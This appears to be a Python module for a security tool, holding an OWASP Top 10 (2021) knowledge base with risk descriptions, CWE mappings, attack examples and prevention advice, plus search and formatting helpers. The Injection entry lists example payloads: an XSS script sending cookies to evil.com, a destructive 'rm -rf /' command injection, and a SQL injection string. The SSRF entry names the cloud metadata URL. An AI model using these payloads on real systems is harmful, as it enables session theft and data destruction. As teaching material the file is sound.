"""
CYBERSEC AI v4.0 - OWASP Top 10 Knowledge Base
Provides detailed information about the OWASP Top 10 (2021) web application
security risks for AI-enriched responses.
"""

from __future__ import annotations

from dataclasses import dataclass, field


@dataclass
class OwaspCategory:
    id: str
    name: str
    description: str
    cwe_mapped: list[str]
    attack_examples: list[str]
    prevention: list[str]
    severity: str
    incidence_rate: str = ""


OWASP_TOP_10_2021: list[OwaspCategory] = [
    OwaspCategory(
        id="A01",
        name="Broken Access Control",
        description=(
            "Restrictions on what authenticated users are allowed to do are not "
            "properly enforced. Attackers can exploit flaws to access unauthorized "
            "functionality and/or data."
        ),
        cwe_mapped=["CWE-200", "CWE-201", "CWE-352", "CWE-639"],
        attack_examples=[
            "Modifying the URL or API request to access another user's data",
            "Elevating privileges from standard user to admin",
            "IDOR (Insecure Direct Object Reference) — changing ?id=123 to ?id=456",
            "Accessing admin pages without authentication",
        ],
        prevention=[
            "Deny by default — require explicit grants",
            "Implement access control mechanisms once and reuse across the application",
            "Enforce record ownership rather than allowing CRUD on any record",
            "Disable web server directory listing",
            "Log access control failures and alert administrators",
            "Rate limit API and controller access",
            "Invalidate JWT tokens on the server after logout",
        ],
        severity="CRITICAL",
        incidence_rate="3.81%",
    ),
    OwaspCategory(
        id="A02",
        name="Cryptographic Failures",
        description=(
            "Failures related to cryptography that lead to exposure of sensitive data. "
            "Previously known as 'Sensitive Data Exposure'. Focus is on the root cause "
            "— the crypto failure itself."
        ),
        cwe_mapped=["CWE-259", "CWE-327", "CWE-331"],
        attack_examples=[
            "Using MD5 or SHA-1 for password hashing",
            "Transmitting data over HTTP instead of HTTPS",
            "Using deprecated TLS versions (1.0, 1.1)",
            "Storing passwords in plaintext or with reversible encryption",
            "Using hard-coded cryptographic keys",
        ],
        prevention=[
            "Classify data and identify which is sensitive per regulations",
            "Don't store sensitive data unnecessarily — discard it ASAP",
            "Encrypt all sensitive data at rest",
            "Use strong standard algorithms (AES-256-GCM, SHA-256, bcrypt)",
            "Enforce HTTPS with HSTS",
            "Use authenticated encryption (GCM mode)",
            "Store passwords with bcrypt, Argon2, or scrypt with salt",
        ],
        severity="CRITICAL",
        incidence_rate="4.49%",
    ),
    OwaspCategory(
        id="A03",
        name="Injection",
        description=(
            "User-supplied data is not validated, filtered, or sanitized by the "
            "application. Hostile data is used directly in queries, commands, or "
            "interpreters."
        ),
        cwe_mapped=["CWE-79", "CWE-89", "CWE-73"],
        attack_examples=[
            "SQL Injection: ' OR '1'='1' --",
            "Command Injection: ; rm -rf / (in system() calls)",
            "XSS: <script>document.location='http://evil.com?c='+document.cookie</script>",
            "LDAP Injection in authentication systems",
            "OS command injection via unsanitized file names",
        ],
        prevention=[
            "Use parameterized queries (prepared statements) — NEVER string concatenation",
            "Use ORM frameworks that handle escaping",
            "Server-side input validation with allowlists",
            "Escape special characters for the specific interpreter",
            "Use LIMIT and other SQL controls to prevent mass disclosure",
            "Implement Content Security Policy (CSP) for XSS prevention",
        ],
        severity="CRITICAL",
        incidence_rate="3.37%",
    ),
    OwaspCategory(
        id="A04",
        name="Insecure Design",
        description=(
            "A broad category representing design and architectural flaws. "
            "Insecure design cannot be fixed by a perfect implementation — "
            "the security controls needed were never created."
        ),
        cwe_mapped=["CWE-209", "CWE-256", "CWE-501", "CWE-522"],
        attack_examples=[
            "No rate limiting on password reset allows brute force of tokens",
            "Security questions that can be answered with public information",
            "Business logic flaws (e.g., negative quantity in shopping cart)",
            "Missing anti-automation on high-value transactions",
        ],
        prevention=[
            "Establish and use secure development lifecycle (SDLC)",
            "Use threat modeling for authentication, access control, and business logic",
            "Write unit and integration tests to validate security controls",
            "Segregate tier layers on network level",
            "Limit resource consumption by user or service",
        ],
        severity="HIGH",
        incidence_rate="3.00%",
    ),
    OwaspCategory(
        id="A05",
        name="Security Misconfiguration",
        description=(
            "Missing appropriate security hardening, misconfigured permissions, "
            "default credentials, unnecessary features enabled, or error messages "
            "that leak sensitive information."
        ),
        cwe_mapped=["CWE-16", "CWE-611"],
        attack_examples=[
            "Default credentials left unchanged (admin/admin)",
            "Directory listing enabled, exposing file structure",
            "Verbose error messages revealing stack traces",
            "Unnecessary ports/services/features enabled",
            "Missing security headers (CSP, X-Frame-Options)",
            "Cloud storage buckets with public access",
        ],
        prevention=[
            "Repeatable hardening process for rapid deployment of locked-down environments",
            "Minimal platform — no unnecessary features, components, documentation",
            "Review and update configurations as part of patch management",
            "Segmented application architecture",
            "Send security directives (headers) to clients",
            "Automate configuration verification",
        ],
        severity="HIGH",
        incidence_rate="4.51%",
    ),
    OwaspCategory(
        id="A06",
        name="Vulnerable and Outdated Components",
        description=(
            "Using components with known vulnerabilities. Libraries, frameworks, "
            "and other software modules run with the same privileges as the application."
        ),
        cwe_mapped=["CWE-1104"],
        attack_examples=[
            "Using a library with a known CVE (e.g., Log4Shell CVE-2021-44228)",
            "Running outdated CMS without security patches",
            "Using end-of-life operating systems or frameworks",
            "Not scanning dependencies for vulnerabilities",
        ],
        prevention=[
            "Remove unused dependencies, features, components, files",
            "Continuously inventory component versions (SBOM)",
            "Monitor CVE databases and security advisories",
            "Obtain components from official sources over secure links",
            "Use tools like Dependabot, Snyk, or OWASP Dependency-Check",
        ],
        severity="HIGH",
        incidence_rate="8.77%",
    ),
    OwaspCategory(
        id="A07",
        name="Identification and Authentication Failures",
        description=(
            "Confirmation of the user's identity, authentication, and session "
            "management is critical. Weaknesses exist when the application permits "
            "brute force, uses weak credentials, or has broken session management."
        ),
        cwe_mapped=["CWE-287", "CWE-384", "CWE-798"],
        attack_examples=[
            "Credential stuffing (using leaked username/password lists)",
            "Brute force attacks against login forms",
            "Session fixation attacks",
            "Storing passwords in plain text or with weak hashing",
            "Missing or ineffective multi-factor authentication",
        ],
        prevention=[
            "Implement multi-factor authentication (MFA)",
            "Ship with no default credentials",
            "Implement weak-password checks (top 10,000 passwords list)",
            "Limit failed login attempts (rate limiting + account lockout)",
            "Use server-side, secure session manager with random session IDs",
            "Hash passwords with bcrypt, Argon2, or scrypt",
        ],
        severity="HIGH",
        incidence_rate="2.55%",
    ),
    OwaspCategory(
        id="A08",
        name="Software and Data Integrity Failures",
        description=(
            "Failures related to code and infrastructure that does not protect "
            "against integrity violations. Insecure CI/CD pipelines, auto-updates "
            "without verification, and untrusted deserialization."
        ),
        cwe_mapped=["CWE-502", "CWE-829"],
        attack_examples=[
            "SolarWinds supply chain attack (compromised update mechanism)",
            "Insecure deserialization leading to RCE",
            "CI/CD pipeline compromise injecting malicious code",
            "Using libraries from untrusted sources without verification",
        ],
        prevention=[
            "Use digital signatures to verify software and data integrity",
            "Ensure libraries and dependencies are from trusted repositories",
            "Use SBOM tools to verify components are not tampered with",
            "Ensure CI/CD pipeline has proper segregation, configuration, and access control",
            "Don't send serialized data to untrusted clients without integrity checks",
        ],
        severity="HIGH",
        incidence_rate="2.05%",
    ),
    OwaspCategory(
        id="A09",
        name="Security Logging and Monitoring Failures",
        description=(
            "Without logging and monitoring, breaches cannot be detected. "
            "Insufficient logging, detection, monitoring, and active response "
            "allows attackers to persist, pivot, and extract data."
        ),
        cwe_mapped=["CWE-778", "CWE-117", "CWE-223"],
        attack_examples=[
            "Attacker maintains access for months without detection",
            "No alerting on failed login attempts",
            "Logs not centralized, easily tampered with",
            "No monitoring of high-value transactions",
            "Penetration tests don't trigger alerts",
        ],
        prevention=[
            "Log all login, access control, and server-side input validation failures",
            "Ensure logs are in a format consumable by SIEM/log management",
            "Ensure log data is encoded correctly to prevent injection",
            "Establish effective monitoring and alerting",
            "Establish or adopt an incident response and recovery plan",
            "Use append-only log storage (tamper-resistant)",
        ],
        severity="MEDIUM",
        incidence_rate="6.51%",
    ),
    OwaspCategory(
        id="A10",
        name="Server-Side Request Forgery (SSRF)",
        description=(
            "SSRF occurs when a web application fetches a remote resource without "
            "validating the user-supplied URL. An attacker can coerce the application "
            "to send crafted requests to unexpected destinations."
        ),
        cwe_mapped=["CWE-918"],
        attack_examples=[
            "Accessing cloud metadata: http://169.254.169.254/latest/meta-data/",
            "Scanning internal networks through the server",
            "Accessing internal services (Redis, Elasticsearch) not exposed publicly",
            "Reading local files via file:// protocol",
        ],
        prevention=[
            "Sanitize and validate all client-supplied input URLs",
            "Enforce URL schema, port, and destination allowlists",
            "Disable HTTP redirections",
            "Do not send raw responses to clients",
            "Segment remote resource access functionality",
            "Block access to cloud metadata endpoints from applications",
        ],
        severity="HIGH",
        incidence_rate="2.72%",
    ),
]


class OwaspKB:
    """OWASP Top 10 knowledge base for AI context enrichment."""

    def __init__(self) -> None:
        self._categories = {cat.id: cat for cat in OWASP_TOP_10_2021}

    def get_category(self, category_id: str) -> OwaspCategory | None:
        """Get a specific OWASP category by ID (e.g., 'A01')."""
        return self._categories.get(category_id.upper())

    def get_all(self) -> list[OwaspCategory]:
        return list(self._categories.values())

    def search(self, keyword: str) -> list[OwaspCategory]:
        """Search categories by keyword in name, description, or examples."""
        lower = keyword.lower()
        results = []
        for cat in self._categories.values():
            if (
                lower in cat.name.lower()
                or lower in cat.description.lower()
                or any(lower in ex.lower() for ex in cat.attack_examples)
            ):
                results.append(cat)
        return results

    def get_summary(self) -> str:
        """Get a condensed summary of the OWASP Top 10 for AI context."""
        lines = ["OWASP Top 10 (2021) Web Application Security Risks:"]
        for cat in OWASP_TOP_10_2021:
            lines.append(f"  {cat.id}: {cat.name} [{cat.severity}]")
            lines.append(f"    {cat.description[:120]}...")
        return "\n".join(lines)

    def format_category(self, category: OwaspCategory) -> str:
        """Format a category into a detailed readable summary."""
        lines = [
            f"OWASP {category.id}: {category.name}",
            f"Severity: {category.severity}",
            f"Incidence Rate: {category.incidence_rate}",
            "",
            f"Description: {category.description}",
            "",
            "CWE Mappings:",
        ]
        for cwe in category.cwe_mapped:
            lines.append(f"  - {cwe}")

        lines.append("\nAttack Examples:")
        for ex in category.attack_examples:
            lines.append(f"  - {ex}")

        lines.append("\nPrevention:")
        for p in category.prevention:
            lines.append(f"  - {p}")

        return "\n".join(lines)
